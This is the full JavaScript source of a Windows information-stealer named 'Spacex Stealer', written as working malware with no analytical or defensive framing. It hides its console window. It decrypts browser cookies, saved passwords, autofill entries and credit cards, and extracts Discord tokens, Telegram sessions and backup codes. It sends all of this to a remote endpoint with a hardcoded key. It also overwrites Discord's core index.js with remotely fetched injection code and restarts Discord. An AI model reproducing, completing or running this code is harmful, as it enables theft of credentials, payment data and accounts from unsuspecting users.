const fs = require("fs"), path = require("path"), httpx = require("axios"), os = require('os') , { execSync, exec: exec } = require("child_process"), crypto = require("crypto"), dpapi = require("win-dpapi"), sqlite3 = require("sqlite3"), FormData = require('form-data'), AdmZip = require('adm-zip');
let api_url = 'https://sa-east-1.aws.data.mongodb-api.com/app/data-jowtd/endpoint/data/v1'; let api_auth = 'b1K9EIQzGDxZEMYapav7MOqtt8kPzkbfkoSxPYxkw3V9tVxQJOVIx3bEtDtvM6Qt'; const local = process.env.LOCALAPPDATA; const discords = []; debug = false; let injection_paths = []

var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
let browser_paths = [ localappdata+'\\Google\\Chrome\\User Data\\Default\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 1\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 2\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 3\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 4\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 5\\',localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\',localappdata+'\\Google\\Chrome\\User Data\\Default\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 1\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 2\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 3\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 4\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Profile 5\\Network\\',localappdata+'\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',appdata+'\\Opera Software\\Opera Stable\\',appdata+'\\Opera Software\\Opera GX Stable\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',localappdata+'\\Microsoft\\Edge\\User Data\\Default\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 1\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 2\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 3\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 4\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 5\\',localappdata+'\\Microsoft\\Edge\\User Data\\Guest Profile\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',localappdata+'\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',localappdata+'\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Default\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',localappdata+'\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

function SendDataToBackEnd(token) { 
    httpx.get('https://sa-east-1.aws.data.mongodb-api.com/app/data-jowtd/endpoint/data/v1/').then(res=> { const url = `${api_url}/api/grabuser?token=${token}&ip=${res.data}&auth=${api_auth}`; httpx.get(url); })
}
  
function GetTokensFromPath(tokenPath) {

    let path_tail = path;
    tokenPath += "\\Local Storage\\leveldb";
    let tokens = [];
  
    if (tokenPath.includes('cord')) {
      if (fs.existsSync(path_tail + '\\Local State')) {
        try {
              fs.readdirSync(tokenPath)
              .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                .split(/\r?\n/)
                .forEach(line => {
                  const pattern = new RegExp(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
                  const foundTokens = line.match(pattern);
                  if (foundTokens) {
                    foundTokens.forEach(token => {
                      let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                      const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
                      token = Buffer.from(token.split('dQw4w9WgXcQ:')[1], 'base64')
                      let start = token.slice(3, 15), middle = token.slice(15, token.length - 16), end = token.slice(token.length - 16, token.length), decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                      
                      decipher.setAuthTag(end);
                      let out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8')
                      if (!tokens.includes(out)) tokens.push(out);
                    })
                  }
                });
              });
        } catch  { }
        return tokens;
      }
    } else {
      try {
        
        fs.readdirSync(path.normalize(tokenPath)).map((file) => {
          if (file.endsWith(".log") || file.endsWith(".ldb")) {
            fs.readFileSync(`${tokenPath}\\${file}`, "utf8")
              .split(/\r?\n/)
              .forEach(async (line) => {
                const regex = [
                  new RegExp(/mfa\.[\w-]{84}/g),
                  new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
                ];
                for (const _regex of regex) {
                  const token = line.match(_regex);
    
                  if (token) {
                    token.forEach((element) => {
                      tokens.push(element);
                    });
                  }
                }
              });
          }
        });
      } catch {
  
      }
    }
    return tokens;
}

function StealTokens() {
    let paths;
  
    if (process.platform == "win32") {
      const local = process.env.LOCALAPPDATA;
      const roaming = process.env.APPDATA;
  
      paths = {
        Discord: path.join(roaming, "Discord"),
        "Discord Canary": path.join(roaming, "discordcanary"),
        "Discord PTB": path.join(roaming, "discordptb"),
        "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
        Opera: path.join(roaming, "Opera Software", "Opera Stable"),
        Brave: path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default" ),
        Yandex: path.join(local, "Yandex", "YandexBrowser", "User Data", "Default" ),
      };
    }
  
    const tokens = {};
    for (let [platform, path] of Object.entries(paths)) {
      const tokenList = GetTokensFromPath(path);
      if (tokenList) {
        tokenList.forEach((token) => {
          SendDataToBackEnd(token)
          if (tokens[platform] === undefined) tokens[platform] = [];
          tokens[platform].push(token);
        });
      }
    }
}


async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })    
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "spacestealerxD"))
    }
    await httpx(`${api_url}/secrets/void/injection/uwu`).then((code => code.data)).then((res => {
        res = res.replace("%API_AUTH_HERE%", api_auth), injection = res
    })).catch(), await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {

                                                    })), 
                                                    
                                                    fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); DiscordListener(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function ParseCookies(path) {
    let path_split = path.split("\\"),
        path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").slice(5);
        var cookies = path + "Cookies",
            cookies_db = path + "cookies.db",
            total_cookies = 0;
        fs.copyFileSync(cookies, cookies_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
        var result = "",
            sql = new sqlite3.Database(cookies_db, (err => {
                err && debug && console.log(err)
            }));
        result += `@~$~@spacex-${path}\n`;
        return await new Promise((resolve => {
            sql.each("SELECT host_key, name, encrypted_value FROM cookies", (function(err, row) {
                err && debug && console.log(err);
                let encrypted_value = row.encrypted_value;
                try {
                    if (1 == encrypted_value[0] && 0 == encrypted_value[1] && 0 == encrypted_value[2] && 0 == encrypted_value[3]) result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${dpapi.unprotectData(encrypted_value,null,"CurrentUser")+"\n".toString("utf-8")}\n`, total_cookies++;
                    else {
                        let start = encrypted_value.slice(3, 15),
                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
                            decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
                        decipher.setAuthTag(end), result += `HOST KEY: ${row.host_key} | NAME: ${row.name} | VALUE: ${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}\n`, total_cookies++
                    }
                } catch (e) {
                    debug && console.log(e)
                }
                0 == total_cookies && (result += "Cookies don't found.")
            }), (function() {
                resolve(result)
            }))
        }))
    }
    return ""
}

async function ParsePasswords(path) {
    let path_split = path.split("\\"),
        path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + "Local State")).os_crypt.encrypted_key, "base64").slice(5);
        var login_data = path + "Login Data",
            passwords_db = path + "passwords.db";
        fs.copyFileSync(login_data, passwords_db);
        const key = dpapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
        var result = "",
            sql = new sqlite3.Database(passwords_db, (err => {
                err && debug && console.log(err)
            }));
        result += `@~$~@spacex-${path}\n`;
        return await new Promise((resolve => {
            sql.each("SELECT origin_url, username_value, password_value FROM logins", (function(err, row) {
                if (err && debug && console.log(err), "" != row.username_value) {
                    let password_value = row.password_value;
                    try {
                        if (1 == password_value[0] && 0 == password_value[1] && 0 == password_value[2] && 0 == password_value[3]) result += `URL: ${row.origin_url} | USERNAME : ${row.username_value} | PASSWORD: ${dpapi.unprotectData(password_value,null,"CurrentUser").toString("utf-8")}\n`;
                        else {
                            let start = password_value.slice(3, 15),
                                middle = password_value.slice(15, password_value.length - 16),
                                end = password_value.slice(password_value.length - 16, password_value.length),
                                decipher = crypto.createDecipheriv("aes-256-gcm", key, start);
                            decipher.setAuthTag(end), result += `URL: ${row.origin_url} | USERNAME : ${row.username_value} | PASSWORD: ${decipher.update(middle,"base64","utf-8")+decipher.final("utf-8")}\n`
                        }
                    } catch (e) {
                        debug && console.log(e)
                    }
                }
            }), (function() {
                resolve(result)
            }))
        }))
    }
    return ""
}

async function ParseAutofill(path) {
    let path_split = path.split("\\"),
        path_tail = (path.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2)).join("\\") + "\\";
    if (path.startsWith(appdata) && (path_tail = path), fs.existsSync(path_tail)) {
        var autofill_data = path + "Web Data",
            autofill_db = path + "Web.db";
        fs.copyFileSync(autofill_data, autofill_db);
        var result = "",
            sql = new sqlite3.Database(autofill_db, (err => {
                err && debug && console.log(err)
            }));
        result += `@~$~@spacex-${path}\n`;
        return await new Promise((resolve => {
            sql.each("SELECT * FROM autofill", (function(err, row) {
                row && (result += `NAME: ${row.name} | VALUE : ${row.value}\n`)
            }), (function() {
                resolve(result)
            }))
        }))
    }
    return ""
}

async function ParseCards(path) {
    let path_split = path.split('\\'), path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2), path_tail = path_split_tail.join('\\') + '\\';
    
    if (path.startsWith(appdata)) path_tail = path;
    if (path.includes('cord')) return;
    
    if (fs.existsSync(path_tail)) {
        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
        var login_data = path + 'Web Data', creditcards_db = path + 'creditcards.db';
        fs.copyFileSync(login_data, creditcards_db);
        
        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
        var result = `@~$~@spacex-${path}\n`, sql = new sqlite3.Database(creditcards_db, err => { if (err) { } });

        const cards = await new Promise((resolve, reject) => {
            sql.each('SELECT * FROM credit_cards', function (err, row) {
                if (err) { }
                if (row['card_number_encrypted'] != '') {
                    let card_number = row['card_number_encrypted'];
                    try {
                        if ((card_number[0] == 1) && (card_number[1] == 0) && (card_number[2] == 0) && (card_number[3] == 0)) {
                            result += 'CC NUMBER: ' + dpapi.unprotectData(card_number, null, 'CurrentUser').toString('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        } else {
                            let start = card_number.slice(3, 15), middle = card_number.slice(15, card_number.length - 16), end = card_number.slice(card_number.length - 16, card_number.length), decipher = crypto.createDecipheriv('aes-256-gcm', key, start); decipher.setAuthTag(end);
                            result += 'CC NUMBER: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + ' | EXPIRY: ' + row['expiration_month'] + '/' + row['expiration_year'] + ' | NAME: ' + row['name_on_card'] + '\n';
                        }
                    } catch (e) { }
                }
            }, function () {
                resolve(result);
            });
        });

        return cards;
    }
    return '';
}

async function SubmitCookies() {
    let cookies = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Cookies") && (cookies += await ParseCookies(browser_paths[i]) || "");
    fs.writeFile(appdata + "\\cookies.txt", cookies, (function(err) {
        if (err) throw err;
        httpx.post(`${api_url}/api/cookies?auth=${api_auth}`, {
            cookies: cookies
        })
    }))
}

async function SubmitPasswords() {
    let passwords = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Login Data") && (passwords += await ParsePasswords(browser_paths[i]) || "");
    fs.writeFile(appdata + "\\passwords.txt", passwords, (function(err) {
        if (err) throw err;
        httpx.post(`${api_url}/api/passwords?auth=${api_auth}`, {
            pass: passwords
        })
    }))
}

async function SubmitAutofill() {
    let autofills = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (autofills += await ParseAutofill(browser_paths[i]) || "");
    fs.writeFile(appdata + "\\autofilldata.txt", autofills, (function(err) {
        if (err) throw err;
        httpx.post(`${api_url}/api/autofill?auth=${api_auth}`, {
            autofill: autofills
        })
    }))
}

async function SubmitCards() {
    let creditcards = "";
    for (let i = 0; i < browser_paths.length; i++) fs.existsSync(browser_paths[i] + "Web Data") && (creditcards += await ParseCards(browser_paths[i]) || "");
    fs.writeFile(appdata + "\\creditcards.txt", creditcards, (function(err) {
        if (err) throw err;
        httpx.post(`${api_url}/api/creditcards?auth=${api_auth}`, {
            cards: creditcards
        })
    }))
}

async function DiscordListener(path) {
    return ;
}

async function SubmitTelegram() {
    if (fs.existsSync(appdata + '\\Telegram Desktop\\tdata')) {
        
        let zip = new AdmZip();
    
        session_files = []
        
        fs.readdir(appdata + '\\Telegram Desktop\\tdata', (err, file) => {
            file.forEach((inside_file) => {
                if (inside_file !== 'temp' && inside_file !== 'dumps' && inside_file !== 'emoji' && inside_file !== 'working' && inside_file !== 'tdummy') { 
                    session_files.push(`${inside_file}`)
                }
            })
    
            session_files.forEach(session_file => {
                zip.addFile(session_file, new Buffer.from(appdata + `\\Telegram Desktop\\tdata\\${session_file}`), 'Spacex Stealer xD!');
            })
    
            zip.writeZip(`TelegramSession.zip`)
            
            httpx.get(`${api_url}/check?key=${api_auth}`).then(res => {
                webhook = res.data;
                const form = new FormData();
                form.append("file", fs.createReadStream("TelegramSession.zip"));
                form.submit(webhook, (error, response) => { fs.unlinkSync('TelegramSession.zip') });
            })
        })
    }
}

function SubmitBackupCodes() {
    let home_dir = os.homedir(); let codes = "";
    
    fs.readdirSync(`${home_dir}//Downloads`).forEach(file => {
        if (file.includes('discord_backup_codes')) {
            const text = fs.readFileSync(`${home_dir}//Downloads//${file}`, 'utf-8')
            codes += `# ${home_dir}\\Downloads\\${file}\n\n${text}\n\n`;
        }
    })

    fs.readdirSync(`${home_dir}//Desktop`).forEach(file => {
        if (file.includes('discord_backup_codes')) {
            const text = fs.readFileSync(`${home_dir}//Desktop//${file}`, 'utf-8')
            codes += `# ${home_dir}\\Desktop\\${file}\n\n${text}\n\n`;
        }
    })

    fs.readdirSync(`${home_dir}//Documents`).forEach(file => {
        if (file.includes('discord_backup_codes')) {
            const text = fs.readFileSync(`${home_dir}//Documents//${file}`, 'utf-8')
            codes += `# ${home_dir}\\Documents\\${file}\n\n${text}\n\n`;
        }
    })

    httpx.post(`${api_url}/api/backupcodes?auth=${api_auth}`, {
        codes: codes
    })
}

function hideSelf() {
    require("node-hide-console-window").hideConsole();
}

class StealerClient {
    constructor () { 
        hideSelf(); InfectDiscords(); StealTokens(); SubmitCookies(); SubmitPasswords(); SubmitAutofill(); SubmitCards(); SubmitTelegram(); SubmitBackupCodes(); StopCords();
    }
}

new StealerClient()